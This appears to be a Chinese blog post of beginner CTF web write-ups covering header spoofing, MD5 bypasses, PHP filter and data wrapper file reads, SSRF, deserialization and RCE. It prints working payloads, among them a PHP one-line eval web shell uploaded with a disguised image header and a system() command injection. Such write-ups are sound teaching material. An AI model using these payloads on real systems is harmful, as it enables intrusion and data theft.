<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary"><title>Hexo</title><link ref="canonical" href="http://example.com/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hexo</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/01/09/NSSCTF%20WEB/">[ Untitled ]</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-01-09</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-03-06</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>title: NSSCTF WEB<br>date: 2023-1-6 10:25:33<br>tags:</p>
<ul>
<li>NSSCTF web安全入门<br>categories:</li>
<li>NSSCTF web安全入门</li>
</ul>

        <h2 id="一、-SWPUCTF-2021-新生赛-jicao"   >
          <a href="#一、-SWPUCTF-2021-新生赛-jicao" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、-SWPUCTF-2021-新生赛-jicao" class="headerlink" title="一、[SWPUCTF 2021 新生赛]jicao"></a>一、[SWPUCTF 2021 新生赛]jicao</h2>
      <p>打开后出现这样一堆代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301071607884.png" alt="image-20230107160708841"></p>
<p>经阅读可知，要想获取flag，需要POST一个值为wllmNB的参数id和GET一个值为{“x“：”wllm“}的参数json（json值的来源：[x]相当于数组的下标，冒号相当于解释说明该数组下标，然后查资料得json的格式为<code>$json = &#39;&#123;&quot;a&quot;:&quot;php&quot;,&quot;b&quot;:&quot;mysql&quot;,&quot;c&quot;:3&#125;&#39;</code>）</p>

        <h3 id="法Ⅰ：HackBar"   >
          <a href="#法Ⅰ：HackBar" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅰ：HackBar" class="headerlink" title="法Ⅰ：HackBar"></a>法Ⅰ：HackBar</h3>
      <p>由于GET函数在URL体现，即从URL传进来的是GET函数</p>
<p>所以URL  <code>http://1.14.71.254:28387/?json=&#123;&quot;x&quot;:&quot;wllm&quot;&#125;</code></p>
<p>选择”Use POST method”</p>
<p>“Body”处则填写需要POST的内容</p>
<p>即如图</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301071630815.png" alt="image-20230107163022749"></p>
<p>EXECUTE后网页便出现了flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301071630308.png" alt="image-20230107163052248"></p>

        <h3 id="法Ⅱ：Burpsuite"   >
          <a href="#法Ⅱ：Burpsuite" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅱ：Burpsuite" class="headerlink" title="法Ⅱ：Burpsuite"></a>法Ⅱ：Burpsuite</h3>
      <p>发送到”repeater”后</p>
<p>GET需要改成POST</p>
<p>（PS：这代表只会用POST请求，后面的东西与它无关）</p>
<p>然后在空白处添上POST的值 id=wllmNB</p>
<p>如图</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301071657640.png" alt="image-20230107165713584"></p>
<p>GO之后得到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301081023505.png" alt="image-20230108102344407"></p>

        <h2 id="二、-SWPUCTF-2021-新生赛-Do-you-know-http"   >
          <a href="#二、-SWPUCTF-2021-新生赛-Do-you-know-http" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、-SWPUCTF-2021-新生赛-Do-you-know-http" class="headerlink" title="二、[SWPUCTF 2021 新生赛]Do_you_know_http"></a>二、[SWPUCTF 2021 新生赛]Do_you_know_http</h2>
      <p>点开环境</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301071718113.png" alt="image-20230107171822067"></p>
<p>告诉我们需要用WLLM浏览器，那就用HackBar添加头</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301081027391.png" alt="image-20230108102732269"></p>
<p>EXECUTE后，它又要求我们使用本地地址</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301081028420.png" alt="image-20230108102819362"></p>
<p>继续添加头，并注意此时URL已经发生变化，在使用HackBar时应注意修改</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301081029323.png" alt="image-20230108102957268"></p>
<p>EXECUTE后，就得到了flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301081030153.png" alt="image-20230108103026112"></p>
<p>该题类似于 [极客大挑战 2019]Http 1</p>

        <h6 id="附上常见请求报文的代表含义"   >
          <a href="#附上常见请求报文的代表含义" class="heading-link"><i class="fas fa-link"></i></a><a href="#附上常见请求报文的代表含义" class="headerlink" title="附上常见请求报文的代表含义"></a>附上常见请求报文的代表含义</h6>
      <p><em>User-Agent：产生请求的浏览器类型，一般可以随意指定，但是当服务器方面有限制则会受到影响，比如爬虫进行检查</em><br><em>Accept：用户声明客户端可以处理的MIME类型，即文件类型</em><br><em>Accept-Encoding：用于声明客户端能够理解的内容编码方式</em><br><em>Accept-Language：用于声明客户端可以理解的自然语言</em><br><em>Cookie：存放用户的身份凭证</em><br><em>Content-Length：请求数据的长度，服务器端只会按照该字段进行长度解析，多余的截断。</em><br><em>Referer：当前访问URL的上一个URL，用户从什么地方来到该页面的</em></p>

        <h2 id="三、-SWPUCTF-2021-新生赛-gift-F12"   >
          <a href="#三、-SWPUCTF-2021-新生赛-gift-F12" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、-SWPUCTF-2021-新生赛-gift-F12" class="headerlink" title="三、[SWPUCTF 2021 新生赛]gift_F12"></a>三、[SWPUCTF 2021 新生赛]gift_F12</h2>
      <p>打开后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301081048166.png" alt="image-20230108104838977"></p>
<p>直接查看网页源代码，并搜索flag，即可得到</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301081050326.png" alt="image-20230108105014274"></p>

        <h2 id="四、-第五空间-2021-WebFTP"   >
          <a href="#四、-第五空间-2021-WebFTP" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、-第五空间-2021-WebFTP" class="headerlink" title="四、[第五空间 2021]WebFTP"></a>四、[第五空间 2021]WebFTP</h2>
      <p>打开环境后是一个登录界面</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131504554.png" alt="image-20230113150457454"></p>
<p>首先考虑是否是sql注入</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131505442.png" alt="image-20230113150527358"></p>
<p>看来不是，再尝试抓包，也毫无所获，只能确确实实找出这个用户名和密码</p>
<p>后来得知像这种年份很老的框架，一般会放在github上有开源框架的，于是在github上搜索webftp</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131548149.png" alt="image-20230113154841074"></p>
<p>找到里面有一个README，点开后在最后便有初始账号</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131549751.png" alt="image-20230113154934695"></p>
<p>账号：admin</p>
<p>密码：admin888</p>
<p>登陆成功，之后便是一堆文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131550875.png" alt="image-20230113155032742"></p>
<p>在一通尝试后，发现有一个可疑的phpinfo.php，下载后在phpstrom中打开并运行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131552182.png" alt="image-20230113155243035"></p>
<p>但这个访问的是本地的，需要改成远程，即把URL中的localhost改成题目的IP或端口，即</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://1.14.71.254:28791//phpinfo.php" >http://1.14.71.254:28791//phpinfo.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>回车后查找flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131556083.png" alt="image-20230113155649987"></p>

        <h2 id="五、-SWPUCTF-2021-新生赛-easy-md5"   >
          <a href="#五、-SWPUCTF-2021-新生赛-easy-md5" class="heading-link"><i class="fas fa-link"></i></a><a href="#五、-SWPUCTF-2021-新生赛-easy-md5" class="headerlink" title="五、[SWPUCTF 2021 新生赛]easy_md5"></a>五、[SWPUCTF 2021 新生赛]easy_md5</h2>
      <p>打开后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301111241802.png" alt="image-20230111124106656"></p>
<p>首先是需要GET变量name和POST变量password，这一点类似于第一题，可以明确使用HackBar</p>
<p>接着往下阅读：要想获得flag，name和password的值不能相同但是它们的MD5值要相同</p>
<p>此处MD5是双等号，即是弱类型比较</p>

        <h6 id="MD5绕过有两种方法：数组绕过和科学计数法绕过"   >
          <a href="#MD5绕过有两种方法：数组绕过和科学计数法绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#MD5绕过有两种方法：数组绕过和科学计数法绕过" class="headerlink" title="MD5绕过有两种方法：数组绕过和科学计数法绕过"></a>MD5绕过有两种方法：数组绕过和科学计数法绕过</h6>
      
        <h3 id="法Ⅰ：数组绕过"   >
          <a href="#法Ⅰ：数组绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅰ：数组绕过" class="headerlink" title="法Ⅰ：数组绕过"></a>法Ⅰ：数组绕过</h3>
      <p>由于MD5不能加密数组，在加密数组的时候会返回NULL，所以我们可以让这两个变量是不同的数组，这样MD5值就相同了（即都为NULL）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131606087.png" alt="image-20230113160607015"></p>
<p>EXECUTE后得到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131606124.png" alt="image-20230113160631065"></p>

        <h3 id="法Ⅱ：科学计数法绕过"   >
          <a href="#法Ⅱ：科学计数法绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅱ：科学计数法绕过" class="headerlink" title="法Ⅱ：科学计数法绕过"></a>法Ⅱ：科学计数法绕过</h3>
      <p>给这两个变量定义成MD5加密后是0e开头的字符串（这个可以从网上找），如图</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131610867.png" alt="image-20230113161054812"></p>
<p>EXECUTE后同样得到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131611223.png" alt="image-20230113161117164"></p>

        <h6 id="附：MD5绕过"   >
          <a href="#附：MD5绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#附：MD5绕过" class="headerlink" title="附：MD5绕过"></a>附：MD5绕过</h6>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/LYJ20010728/article/details/116779357" >https://blog.csdn.net/LYJ20010728/article/details/116779357</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="六、-SWPUCTF-2021-新生赛-include"   >
          <a href="#六、-SWPUCTF-2021-新生赛-include" class="heading-link"><i class="fas fa-link"></i></a><a href="#六、-SWPUCTF-2021-新生赛-include" class="headerlink" title="六、[SWPUCTF 2021 新生赛]include"></a>六、[SWPUCTF 2021 新生赛]include</h2>
      <p>打开环境后要求上传一个文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141346762.png" alt="image-20230114134608687"></p>
<p>那就随便上传一个文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141346152.png" alt="image-20230114134633094"></p>
<p>它说flag在flag.php中，那尝试一下传入flag.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141348351.png" alt="image-20230114134837268"></p>
<p>看来不行</p>
<p>一般有include或是include_once可以想到用php的伪协议</p>
<p><code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<p>读取源代码并进行base64编码输出</p>
<p>于是便得到一串base64编码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141353992.png" alt="image-20230114135326851"></p>
<p>用Cyberchef进行解码得到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141354123.png" alt="image-20230114135414070"></p>

        <h6 id="附：常用php伪协议-celtyl"   >
          <a href="#附：常用php伪协议-celtyl" class="heading-link"><i class="fas fa-link"></i></a><a href="#附：常用php伪协议-celtyl" class="headerlink" title="附：常用php伪协议 celtyl"></a>附：常用php伪协议 celtyl</h6>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/wjrblogs/p/12285202.html" >https://www.cnblogs.com/wjrblogs/p/12285202.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="七、-SWPUCTF-2021-新生赛-PseudoProtocols"   >
          <a href="#七、-SWPUCTF-2021-新生赛-PseudoProtocols" class="heading-link"><i class="fas fa-link"></i></a><a href="#七、-SWPUCTF-2021-新生赛-PseudoProtocols" class="headerlink" title="七、[SWPUCTF 2021 新生赛]PseudoProtocols"></a>七、[SWPUCTF 2021 新生赛]PseudoProtocols</h2>
      <p>打开后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141421711.png" alt="image-20230114142111659"></p>
<p>它想让我们找hint.php文件，而且注意到此时URL上已经传入了参数wllm，可以使用伪协议读取这个hint.php文件</p>
<p>在后面输入</p>
<p><code>php://filter/read=convert.base64-encode/resource=hint.php</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141424733.png" alt="image-20230114142428678"></p>
<p>解码后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141425949.png" alt="image-20230114142506902"></p>
<p>提示我们去这个/test，于是重新输入/test2222222222222.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141426075.png" alt="image-20230114142627016"></p>
<p>阅读代码后发现是需要传入参数a，a要求传入文件，并且文件内容为：I want flag</p>
<p>利用data://协议:</p>
<p>先将I want flag变成base64编码格式，即SSB3YW50IGZsYWc=</p>
<p>接着输入</p>
<p><code>?a=data://text/plain;base64,SSB3YW50IGZsYWc=</code></p>
<p>回车后得到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141433590.png" alt="image-20230114143315508"></p>
<p>（PS：也可以直接输入<code>?a=data://text/plain,I want flag</code>，即不将I want flag变成base64编码格式）</p>

        <h2 id="八、-NISACTF-2022-easyssrf"   >
          <a href="#八、-NISACTF-2022-easyssrf" class="heading-link"><i class="fas fa-link"></i></a><a href="#八、-NISACTF-2022-easyssrf" class="headerlink" title="八、[NISACTF 2022]easyssrf"></a>八、[NISACTF 2022]easyssrf</h2>
      <p>打开后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141524463.png" alt="image-20230114152400330"></p>
<p>随便输个网址尝试一下</p>
<p><code>http://www.bilibili.com</code></p>
<p>结果返回</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141525596.png" alt="image-20230114152501550"></p>
<p>看来不对，再试试直接输入flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141525920.png" alt="image-20230114152543873"></p>
<p>那就看看提示文件，输入file:///fl4g（因为说了提示文件是/fl4g，所以有三个/）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141526545.png" alt="image-20230114152647479"></p>
<p>访问这个<code>/ha1x1ux1u.php</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141527156.png" alt="image-20230114152723108"></p>
<p>阅读代码后可知，需要传入file，而且flag在/flag里</p>
<p>尝试伪协议</p>
<p><code>?file=php://filter/read=convert.base64-encode/resource=/flag</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141531800.png" alt="image-20230114153124729"></p>
<p>解码后获得flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141531378.png" alt="image-20230114153154328"></p>

        <h2 id="九、-SWPUCTF-2021-新生赛-ez-unserialize"   >
          <a href="#九、-SWPUCTF-2021-新生赛-ez-unserialize" class="heading-link"><i class="fas fa-link"></i></a><a href="#九、-SWPUCTF-2021-新生赛-ez-unserialize" class="headerlink" title="九、[SWPUCTF 2021 新生赛]ez_unserialize"></a>九、[SWPUCTF 2021 新生赛]ez_unserialize</h2>
      <p>打开环境后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161247333.png" alt="image-20230116124720192"></p>
<p>没有看见题目，查看网页源代码和用burpsuite都没有发现，用dirsearch工具扫描一下</p>

        <h6 id="工具使用方法："   >
          <a href="#工具使用方法：" class="heading-link"><i class="fas fa-link"></i></a><a href="#工具使用方法：" class="headerlink" title="工具使用方法："></a>工具使用方法：</h6>
      
        <h6 id="在该界面右键进入终端"   >
          <a href="#在该界面右键进入终端" class="heading-link"><i class="fas fa-link"></i></a><a href="#在该界面右键进入终端" class="headerlink" title="在该界面右键进入终端"></a>在该界面右键进入终端</h6>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161256656.png" alt="image-20230116125634575"></p>

        <h6 id="再输入"   >
          <a href="#再输入" class="heading-link"><i class="fas fa-link"></i></a><a href="#再输入" class="headerlink" title="再输入"></a>再输入</h6>
      
        <h6 id="python-dirsearch-py-u-当前的URL"   >
          <a href="#python-dirsearch-py-u-当前的URL" class="heading-link"><i class="fas fa-link"></i></a><a href="#python-dirsearch-py-u-当前的URL" class="headerlink" title="python .\dirsearch.py -u +当前的URL"></a><code>python .\dirsearch.py -u +当前的URL</code></h6>
      <p>在本题则是输入</p>
<p><code>python .\dirsearch.py -u http://1.14.71.254:28197/</code></p>
<p>回车后即开始扫描</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161259909.png" alt="image-20230116125921816"></p>
<p>数字表示HTTP的状态码</p>
<p>可以看到有两个状态码都是200的，即可以访问的，尝试后发现只有/robots.txt可以访问</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161303862.png" alt="image-20230116130354814"></p>
<p>提示我们访问/cl45s.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161305488.png" alt="image-20230116130525410"></p>
<p>阅读代码后发现，要想获得flag，那么参数admin就需要等于admin，参数passwd需要等于ctf，但一开始是将参数admin定义为user，参数passwd定义为123456的，所以我们就需要修改这两个参数的值，也可以得知这个与序列化有关，因此应该传入反序列化后满足条件的参数p</p>
<p>把这段代码复制到Phpstorm查看wllm类的序列化，稍加修改，注意添上echo serialize</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;cl45s.php&quot;);</span><br><span class="line"></span><br><span class="line">class wllm&#123;</span><br><span class="line"></span><br><span class="line">    public $admin;</span><br><span class="line">    public $passwd;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;admin =&quot;user&quot;;</span><br><span class="line">        $this-&gt;passwd = &quot;123456&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;ctf&quot;)&#123;</span><br><span class="line">            include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &quot;Just a bit more!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$p = new wllm();</span><br><span class="line">echo serialize($p);</span><br><span class="line">//$p = $_GET[&#x27;p&#x27;];</span><br><span class="line">//unserialize($p);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>运行后得到类wllm的序列化</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161501367.png" alt="image-20230116150108299"></p>
<p>即O:4:”wllm”:2:{s:5:”admin”;s:4:”user”;s:6:”passwd”;s:6:”123456”;}</p>
<p>于是将两个参数的值修改，即在url上输入</p>
<p><code>?p=O:4:&quot;wllm&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;&#125;</code></p>
<p>回车后得到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161344813.png" alt="image-20230116134408722"></p>

        <h6 id="附：CTF中的序列化与反序列化"   >
          <a href="#附：CTF中的序列化与反序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#附：CTF中的序列化与反序列化" class="headerlink" title="附：CTF中的序列化与反序列化"></a>附：CTF中的序列化与反序列化</h6>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.manongjc.com/detail/17-iffyxbsaebsmupt.html" >http://www.manongjc.com/detail/17-iffyxbsaebsmupt.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="十、-SWPUCTF-2021-新生赛-no-wakeup"   >
          <a href="#十、-SWPUCTF-2021-新生赛-no-wakeup" class="heading-link"><i class="fas fa-link"></i></a><a href="#十、-SWPUCTF-2021-新生赛-no-wakeup" class="headerlink" title="十、[SWPUCTF 2021 新生赛]no_wakeup"></a>十、[SWPUCTF 2021 新生赛]no_wakeup</h2>
      <p>打开环境后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309061554316.png" alt="image-20230906155442200"></p>
<p>点金连接后，也是一串代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161333824.png" alt="image-20230116133351743"></p>
<p>与上一题类似，反序列化，但是本题多了wakeup函数，由于在反序列化执行之前，会先执行__wakeup函数，所以需要绕过</p>
<p>绕过_wakeup函数的方法：<em>当成员属性数目大于实际数目时可绕过wakeup方法</em></p>
<p>所以需要把成员数目的2变成大于2的数字，例如4，即输入</p>
<p><code>?p=O:6:&quot;HaHaHa&quot;:4:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;&#125;</code></p>
<p>回车得到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161338946.png" alt="image-20230116133842852"></p>

        <h2 id="十五、-SWPUCTF-2021-新生赛-easyupload1-0"   >
          <a href="#十五、-SWPUCTF-2021-新生赛-easyupload1-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#十五、-SWPUCTF-2021-新生赛-easyupload1-0" class="headerlink" title="十五、[SWPUCTF 2021 新生赛]easyupload1.0"></a>十五、[SWPUCTF 2021 新生赛]easyupload1.0</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151651849.png" alt="image-20240115165127781"></p>
<p>上传一个写有一句话木马的php格式的文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151652289.png" alt="image-20240115165250245"></p>
<p>被过滤了，上传写有一句话木马jpg格式的文件</p>
<p><code>GIF89a</code></p>
<script language='php'>@eval($_POST[shell]);</script>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151654815.png" alt="image-20240115165435741"></p>
<p>上传成功</p>
<p>抓包修改文件类型为php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151657048.png" alt="image-20240115165705981"></p>
<p>发送后，用蚁剑连接</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151657098.png" alt="image-20240115165739952"></p>
<p>添加数据后在文件列表里找到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151659646.png" alt="image-20240115165912580"></p>
<p>尝试提交发现是假的，，，</p>

        <h2 id="十八、-SWPUCTF-2021-新生赛-caidao"   >
          <a href="#十八、-SWPUCTF-2021-新生赛-caidao" class="heading-link"><i class="fas fa-link"></i></a><a href="#十八、-SWPUCTF-2021-新生赛-caidao" class="headerlink" title="十八、[SWPUCTF 2021 新生赛]caidao"></a>十八、[SWPUCTF 2021 新生赛]caidao</h2>
      <p>打开环境后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161536904.png" alt="image-20230116153620739"></p>
<p>是一句话木马，便可以用蚁剑</p>
<p>添加数据</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161537841.png" alt="image-20230116153737772"></p>
<p>双击查看文件</p>
<p>在根目录下找到/flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161538298.png" alt="image-20230116153841184"></p>
<p>打开后得到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161538981.png" alt="image-20230116153858927"></p>
<p>该题类似于[极客大挑战 2019]Knife 1</p>

        <h2 id="十九、-SWPUCTF-2021-新生赛-easyrce"   >
          <a href="#十九、-SWPUCTF-2021-新生赛-easyrce" class="heading-link"><i class="fas fa-link"></i></a><a href="#十九、-SWPUCTF-2021-新生赛-easyrce" class="headerlink" title="十九、[SWPUCTF 2021 新生赛]easyrce"></a>十九、[SWPUCTF 2021 新生赛]easyrce</h2>
      <p>打开后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309061640144.png" alt="image-20230906164009106"></p>
<p>题目已经提示了这是RCE题目，而且使用GET方法</p>
<p>使用命令执行函数system()</p>
<p>输入</p>
<p><code>/?url=system(&quot;ls&quot;);</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309061645013.png" alt="image-20230906164502980"></p>
<p>再打开根目录，输入</p>
<p><code>/?url=system(&quot;ls /&quot;)；</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309061645758.png" alt="image-20230906164547722"></p>
